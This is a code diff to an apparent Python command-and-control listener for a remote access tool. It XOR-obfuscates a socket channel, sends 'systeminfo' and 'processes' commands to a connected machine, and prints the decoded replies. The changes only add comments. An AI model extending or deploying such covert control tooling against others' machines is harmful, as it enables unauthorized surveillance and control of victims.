@@ -29,7 +29,7 @@ def xor(msg):
         newMsg += str(chr(decrChar)) # append to new newMessage
     return str.encode(newMsg) # return result in bytes
 
-def receiveMsg(conn):
+def receiveMsg(conn):  # receive a variable amount of bytes and
     recv = conn.recv(8).decode()  # recieve incoming message length (up to 8 hex digits)
     print(f"message length encoded: {recv}")  # print decoded recieved data
     msg = xor(recv)  # decode the message received
@@ -38,6 +38,7 @@ def receiveMsg(conn):
     print(f"message length (base 10): {msgLen}")
     print("message decoded:\n")
     
+    #totMsg = b''  # initialize total message storage variable
     
     while msgLen > 0: # when message length is less than 0, stop recieving
         if msgLen < 1024:  # if message length is less than 1024, only recieve the rest of the message
@@ -48,7 +49,10 @@ def receiveMsg(conn):
             msg = xor(recv)  # xor decode 1024 bytes
             
         print(f"{msg.decode()}", end="")
+        #totMsg += msg  # append bytes to total message storage variable
         msgLen = msgLen - 1024  # decrement message length
+        
+    #return totMsg  # return total message decrypted bytes
         
 def main():
     while True: 
@@ -155,7 +159,7 @@ def main():
                 f.close() # close destination file
                 '''
                 break
-            elif userInput.lower() == "systeminfo" or userInput.lower() == "processes":
+            elif userInput.lower() == "systeminfo" or userInput.lower() == "processes":  # processes and systeminfo use the same receive function
                 userInput = xor(userInput)  # xor user input
                 conn.sendall(userInput)  # send xor'd user input
                 receiveMsg(conn)
